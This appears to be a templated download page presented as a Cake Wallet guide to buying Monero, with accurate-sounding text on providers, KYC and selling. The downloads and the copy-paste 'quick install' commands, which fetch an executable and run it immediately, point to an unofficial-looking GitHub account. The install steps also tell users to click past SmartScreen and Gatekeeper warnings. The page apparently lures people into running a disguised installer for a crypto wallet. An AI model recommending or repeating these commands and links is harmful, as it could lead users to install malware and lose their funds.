![Cake Wallet buy monero guide](assets/cake-wallet-buy-monero-article-banner.png)

# Buy Monero With Cake Wallet

Who takes the money, what they ask for, and what the wallet does not control.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the buy flow, choose Monero, pick the provider that serves your country and payment method, and complete that provider's checks. The coins arrive in your wallet once the provider releases them. Cake Wallet routes the purchase; the provider handles payment, identity checks and delivery times.

<!-- ARTICLE-BODY-BEGIN -->

## Who processes the purchase
The buy screen is a marketplace of providers, not a shop run by Cake Wallet. Each provider sets its own payment methods, limits, fees and identity requirements, and each one answers for its own orders. The wallet's job is to hand over an address and show you the order.

That split decides who to ask when something is slow. A card that was charged but no coin arrived is a provider question with a provider reference number, not a wallet bug.

## Payment options
Card payments are the common route, bank transfer is cheaper and slower, and some providers support only one or two countries. The list you see depends on where you are and what you are buying, so two people in different countries legitimately see different options.

Availability changes without notice, which is why no guide can promise a method for a country. If the app offers nothing, try a different fiat currency or provider before concluding the feature is broken.

## Buying Bitcoin and other coins
The same flow handles Bitcoin and other supported coins: choose the asset, choose the provider, send the payment. Monero purchases attract more provider scrutiny than Bitcoin, mainly because fewer providers serve XMR at all.

Buying into the wallet is not the only route in. A swap from a coin you already hold avoids a payment provider entirely, and it is often cheaper for small amounts than a card purchase with its fixed fee.

Keep the wallet on the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>: provider integrations change between builds, and an old build can hide a provider that would otherwise serve your country.

## Selling instead of buying
Selling is the reverse flow with the same provider model: you send coin, the provider pays out fiat through its own channels, and its checks apply. Payout methods and timing are provider-side facts, not wallet settings.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-sell-crypto.md">Sell crypto in Cake Wallet</a> covers that route, including why a payout can be delayed by the provider's own review rather than by the chain.

## Identity and privacy
The wallet itself needs no account, but a provider that takes a card or a bank transfer usually does need identity documents. That is a legal obligation on the provider, not a Cake Wallet feature, and it does not apply to receiving or sending on-chain.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md">Cake Wallet KYC and anonymous use</a> separates the three layers: wallet, provider and chain, so you can see exactly which step introduces the identity check.

## Spending what you bought
Buying is the start of holding, not the end of the task. Once the coins are in the wallet you can send them, swap them or spend them at a merchant, and each of those has its own limits.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cake-pay-gift-card.md">Buy a Cake Pay gift card</a> explains how to turn a balance into something a shop accepts, including which coins are taken directly.

## FAQ
### Can I buy crypto with a debit card?
Yes, where a provider serves your country and card type. The provider, not Cake Wallet, processes the payment.
### Can US residents buy Monero?
Some providers serve US customers for XMR and some do not. The app only shows providers that serve your region.
### Which providers handle buys?
The buy flow lists them per region. Documented integrations include MoonPay and Onramper, and availability changes.
### Can I cash out a crypto wallet?
You can sell through a provider, which pays out fiat by its own methods. The wallet cannot convert funds to a bank account by itself.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[sell crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-sell-crypto.md) · [Cake Wallet KYC and anonymous use](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) · [buy a Cake Pay gift card](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cake-pay-gift-card.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
